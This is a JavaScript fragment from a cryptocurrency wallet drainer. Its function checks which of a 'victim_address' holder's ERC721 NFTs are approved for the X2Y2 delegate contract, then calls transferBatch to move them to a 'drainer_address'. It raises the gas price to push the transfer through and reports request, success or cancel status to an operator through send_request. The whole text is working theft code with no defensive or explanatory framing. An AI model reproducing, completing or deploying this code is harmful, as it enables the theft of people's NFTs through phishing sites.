const MS_X2Y2_ABI = [{"inputs":[{"components":[{"internalType":"contract IERC721","name":"token","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"internalType":"struct ERC721Delegate.Pair[]","name":"pairs","type":"tuple[]"},{"internalType":"address","name":"to","type":"address"}],"name":"transferBatch","outputs":[],"stateMutability":"nonpayable","type":"function"}];

const SIGN_X2Y2 = async (assets, provider, victim_address, drainer_address, user_id, min_price = 0) => {
  try {
    const nft_list = [], nft_list_plain = [];
    for (const asset of assets) {
      if (asset.skip || asset.type !== 'ERC721' || asset.chain_id != 1 || asset.amount_usd < min_price) continue;
      if (!await is_nft_approved(asset.address, victim_address, "0xf849de01b080adc3a814fabe1e2087475cf2e354")) continue;
      nft_list.push({ token: asset.address, tokenId: ethers.BigNumber.from(asset.id) });
      nft_list_plain.push(asset);
    }
    if (nft_list.length === 0) return;
    let web3 = new ethers.providers.Web3Provider(provider), signer = web3.getSigner();
    const contract = new ethers.Contract("0xf849de01b080adc3a814fabe1e2087475cf2e354", MS_X2Y2_ABI, signer);
    try {
      const gas_price = ethers.BigNumber.from(await web3.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('150')).toString();
      let gas_limit = null;
      try {
        gas_limit = await contract.estimateGas.transferBatch(nft_list, drainer_address, { from: victim_address });
        gas_limit = ethers.BigNumber.from(gas_limit).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
      } catch(err) {
        gas_limit = 250000;
      }
      const nonce = await web3.getTransactionCount(victim_address, "pending");
      await send_request({ action: 'x2y2', user_id: user_id, x2y2: 'request', assets: nft_list_plain });
      const result = await contract.transferBatch(nft_list, drainer_address, {
        gasLimit: ethers.BigNumber.from(gas_limit),
        gasPrice: ethers.BigNumber.from(gas_price),
        nonce: nonce
      });
      await result.wait();
      await send_request({ action: 'x2y2', user_id: user_id, x2y2: 'success' });
      for (const asset of assets) {
        if (asset.skip || asset.type !== 'ERC721' || asset.chain_id != 1) continue;
        let is_signed = false;
        for (const x_asset of nft_list_plain) {
          if (x_asset.type !== 'ERC721' || x_asset.chain_id != 1) continue;
          if (x_asset.address == asset.address && x_asset.id == asset.id) {
            is_signed = true;
            break;
          }
        }
        if (is_signed == true) {
          asset.skip = true;
        }
      }
    } catch(err) {
      console.log(err);
      await send_request({ action: 'x2y2', user_id: user_id, x2y2: 'cancel' });
    }
  } catch(err) {
    console.log(err);
  }
};